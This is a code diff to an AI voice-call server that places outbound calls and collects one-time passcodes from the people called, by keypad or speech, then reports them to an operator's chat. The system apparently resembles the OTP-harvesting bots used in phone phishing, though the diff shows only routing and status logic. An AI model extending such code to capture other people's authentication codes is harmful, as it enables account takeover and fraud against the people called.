@@ -111,12 +111,19 @@ function scheduleSilenceTimer(callSid, timeoutMs = 30000) {
 
 function applyInitialDigitIntent(callSid, callConfig) {
   if (!digitService || !callConfig) return null;
+  if (callConfig.digit_intent) {
+    return {
+      intent: callConfig.digit_intent,
+      expectation: digitService.getExpectation(callSid) || null
+    };
+  }
   const result = digitService.prepareInitialExpectation(callSid, callConfig);
   callConfig.digit_intent = result.intent;
+  callConfigurations.set(callSid, callConfig);
   if (result.intent?.mode === 'dtmf' && result.expectation) {
-    callConfig.first_turn_decided = true;
-    callConfigurations.set(callSid, callConfig);
-    webhookService.addLiveEvent(callSid, `🔢 Man detected (${result.intent.reason})`, { force: true });
+    webhookService.addLiveEvent(callSid, `🔢 DTMF intent detected (${result.intent.reason})`, { force: true });
+  } else {
+    webhookService.addLiveEvent(callSid, `🗣️ Normal call flow (${result.intent?.reason || 'no_signal'})`, { force: true });
   }
   return result;
 }
@@ -1216,6 +1223,12 @@ app.ws('/connection', (ws, req) => {
           const digits = msg?.dtmf?.digits || msg?.dtmf?.digit || '';
           if (digits) {
             clearSilenceTimer(callSid);
+            const callConfig = callConfigurations.get(callSid);
+            const isDigitIntent = callConfig?.digit_intent?.mode === 'dtmf';
+            if (!isDigitIntent) {
+              webhookService.addLiveEvent(callSid, `🔢 Keypad: ${digits} (ignored - normal flow)`, { force: true });
+              return;
+            }
             const expectation = digitService?.getExpectation(callSid);
             console.log(`Media DTMF for ${callSid}: "${digits}" (expectation ${expectation ? 'present' : 'missing'})`);
             if (!expectation) {
@@ -1285,6 +1298,8 @@ app.ws('/connection', (ws, req) => {
       }
       clearSilenceTimer(callSid);
 
+      const callConfig = callConfigurations.get(callSid);
+      const isDigitIntent = callConfig?.digit_intent?.mode === 'dtmf';
       const otpContext = digitService.getOtpContext(text, callSid);
       console.log(`Customer: ${otpContext.maskedForLogs}`);
 
@@ -1309,17 +1324,13 @@ app.ws('/connection', (ws, req) => {
       }
       
       webhookService.recordTranscriptTurn(callSid, 'user', otpContext.raw);
-      if (otpContext.codes && otpContext.codes.length && digitService?.hasExpectation(callSid)) {
+      if (isDigitIntent && otpContext.codes && otpContext.codes.length && digitService?.hasExpectation(callSid)) {
         const progress = digitService.formatOtpForDisplay(otpContext.codes[otpContext.codes.length - 1], 'progress');
         webhookService.addLiveEvent(callSid, `🔢 ${progress}`, { force: true });
         const collection = digitService.recordDigits(callSid, otpContext.codes[otpContext.codes.length - 1], { timestamp: Date.now(), source: 'spoken' });
         await digitService.handleCollectionResult(callSid, collection, gptService, interactionCount, 'spoken', { allowCallEnd: true });
       }
-      if (digitService?.hasExpectation(callSid)) {
-        return;
-      }
-
-      if (digitService?.hasExpectation(callSid)) {
+      if (isDigitIntent && digitService?.hasExpectation(callSid)) {
         return;
       }
 
@@ -1353,14 +1364,6 @@ app.ws('/connection', (ws, req) => {
       const session = activeCalls.get(callSid);
       if (session) {
         session.interactionCount = interactionCount;
-      }
-
-      const callConfig = callConfigurations.get(callSid);
-      if (interactionCount === 1 && callConfig) {
-        const started = await digitService.maybeStartFirstTurnCollection(callSid, callConfig, gptService, interactionCount, otpContext.raw);
-        if (started) {
-          return;
-        }
       }
 
     });
@@ -1521,6 +1524,8 @@ app.ws('/vonage/stream', (ws, req) => {
     transcriptionService.on('transcription', async (text) => {
       if (!text) return;
       clearSilenceTimer(callSid);
+      const callConfig = callConfigurations.get(callSid);
+      const isDigitIntent = callConfig?.digit_intent?.mode === 'dtmf';
       const otpContext = digitService.getOtpContext(text, callSid);
       try {
         await db.addTranscript({
@@ -1540,11 +1545,14 @@ app.ws('/vonage/stream', (ws, req) => {
         console.error('Database error adding user transcript:', dbError);
       }
       webhookService.recordTranscriptTurn(callSid, 'user', otpContext.raw);
-      if (otpContext.codes && otpContext.codes.length && digitService?.hasExpectation(callSid)) {
+      if (isDigitIntent && otpContext.codes && otpContext.codes.length && digitService?.hasExpectation(callSid)) {
         const progress = digitService.formatOtpForDisplay(otpContext.codes[otpContext.codes.length - 1], 'progress');
         webhookService.addLiveEvent(callSid, `🔢 ${progress}`, { force: true });
         const collection = digitService.recordDigits(callSid, otpContext.codes[otpContext.codes.length - 1], { timestamp: Date.now(), source: 'spoken' });
         await digitService.handleCollectionResult(callSid, collection, gptService, interactionCount, 'spoken', { allowCallEnd: true });
+      }
+      if (isDigitIntent && digitService?.hasExpectation(callSid)) {
+        return;
       }
       if (!otpContext.maskedForGpt || !otpContext.maskedForGpt.trim()) {
         interactionCount += 1;
@@ -1575,13 +1583,6 @@ app.ws('/vonage/stream', (ws, req) => {
         session.interactionCount = interactionCount;
       }
 
-      const callConfig = callConfigurations.get(callSid);
-      if (interactionCount === 1 && callConfig) {
-        const started = await digitService.maybeStartFirstTurnCollection(callSid, callConfig, gptService, interactionCount, otpContext.raw);
-        if (started) {
-          return;
-        }
-      }
     });
 
     ws.on('message', (data) => {
@@ -1676,6 +1677,7 @@ app.ws('/aws/stream', (ws, req) => {
       if (!text) return;
       clearSilenceTimer(callSid);
       const session = await sessionPromise;
+      const isDigitIntent = session?.callConfig?.digit_intent?.mode === 'dtmf';
       const otpContext = digitService.getOtpContext(text, callSid);
       try {
         await db.addTranscript({
@@ -1696,7 +1698,7 @@ app.ws('/aws/stream', (ws, req) => {
       }
 
       webhookService.recordTranscriptTurn(callSid, 'user', otpContext.raw);
-      if (otpContext.codes && otpContext.codes.length && digitService?.hasExpectation(callSid)) {
+      if (isDigitIntent && otpContext.codes && otpContext.codes.length && digitService?.hasExpectation(callSid)) {
         const progress = digitService.formatOtpForDisplay(otpContext.codes[otpContext.codes.length - 1], 'progress');
         webhookService.addLiveEvent(callSid, `🔢 ${progress}`, { force: true });
         const collection = digitService.recordDigits(callSid, otpContext.codes[otpContext.codes.length - 1], { timestamp: Date.now(), source: 'spoken' });
@@ -1705,6 +1707,9 @@ app.ws('/aws/stream', (ws, req) => {
           await db.updateCallState(callSid, 'route_requested', { reason: collection.route, via: 'menu' }).catch(() => {});
         }
         await digitService.handleCollectionResult(callSid, collection, session.gptService, interactionCount, 'spoken', { allowCallEnd: true });
+      }
+      if (isDigitIntent && digitService?.hasExpectation(callSid)) {
+        return;
       }
 
       if (shouldCloseConversation(otpContext.maskedForGpt) && interactionCount >= 1) {
@@ -1770,6 +1775,19 @@ async function handleCallEnd(callSid, callStartTime) {
   try {
     const callEndTime = new Date();
     const duration = Math.round((callEndTime - callStartTime) / 1000);
+    const terminalStatuses = new Set(['completed', 'no-answer', 'no_answer', 'busy', 'failed', 'canceled']);
+    const normalizeStatus = (value) => String(value || '').toLowerCase().replace(/_/g, '-');
+    const initialCallDetails = await db.getCall(callSid);
+    const persistedStatus = normalizeStatus(initialCallDetails?.status || initialCallDetails?.twilio_status);
+    const finalStatus = terminalStatuses.has(persistedStatus) ? persistedStatus : 'completed';
+    const notificationMap = {
+      completed: 'call_completed',
+      'no-answer': 'call_no_answer',
+      busy: 'call_busy',
+      failed: 'call_failed',
+      canceled: 'call_canceled'
+    };
+    const notificationType = notificationMap[finalStatus] || 'call_completed';
     if (digitService) {
       digitService.clearCallState(callSid);
     }
@@ -1795,7 +1813,7 @@ async function handleCallEnd(callSid, callStartTime) {
       };
     }
     
-    await db.updateCallStatus(callSid, 'completed', {
+    await db.updateCallStatus(callSid, finalStatus, {
       ended_at: callEndTime.toISOString(),
       duration: duration,
       call_summary: summary.summary,
@@ -1836,26 +1854,28 @@ async function handleCallEnd(callSid, callStartTime) {
           });
         // Suppressed verbose digit timeline to avoid leaking sensitive digits in notifications
       }
-      await db.createEnhancedWebhookNotification(callSid, 'call_completed', callDetails.user_chat_id);
+      await db.createEnhancedWebhookNotification(callSid, notificationType, callDetails.user_chat_id);
       
       // Schedule transcript notification with delay
-      setTimeout(async () => {
-        try {
-          await db.createEnhancedWebhookNotification(callSid, 'call_transcript', callDetails.user_chat_id);
-        } catch (transcriptError) {
-          console.error('Error creating transcript notification:', transcriptError);
-        }
-      }, 2000);
+      if (finalStatus === 'completed') {
+        setTimeout(async () => {
+          try {
+            await db.createEnhancedWebhookNotification(callSid, 'call_transcript', callDetails.user_chat_id);
+          } catch (transcriptError) {
+            console.error('Error creating transcript notification:', transcriptError);
+          }
+        }, 2000);
+      }
     }
 
-    console.log(`Enhanced adaptive call ${callSid} completed`);
+    console.log(`Enhanced adaptive call ${callSid} ended (${finalStatus})`);
     console.log(`Duration: ${duration}s | Messages: ${transcripts.length} | Adaptations: ${adaptationAnalysis.personalityChanges || 0}`);
     if (adaptationAnalysis.finalPersonality) {
       console.log(`Final personality: ${adaptationAnalysis.finalPersonality}`);
     }
 
     // Log service health
-    await db.logServiceHealth('call_system', 'call_completed', {
+    await db.logServiceHealth('call_system', `call_${finalStatus}`, {
       call_sid: callSid,
       duration: duration,
       interactions: transcripts.length,
@@ -2501,7 +2521,6 @@ app.post('/outbound-call', async (req, res) => {
       collection_max_retries: req.body?.collection_max_retries || null,
       collection_mask_for_gpt: req.body?.collection_mask_for_gpt,
       collection_speak_confirmation: req.body?.collection_speak_confirmation,
-      first_turn_decided: false,
       template_policy: templatePolicy
     };
     
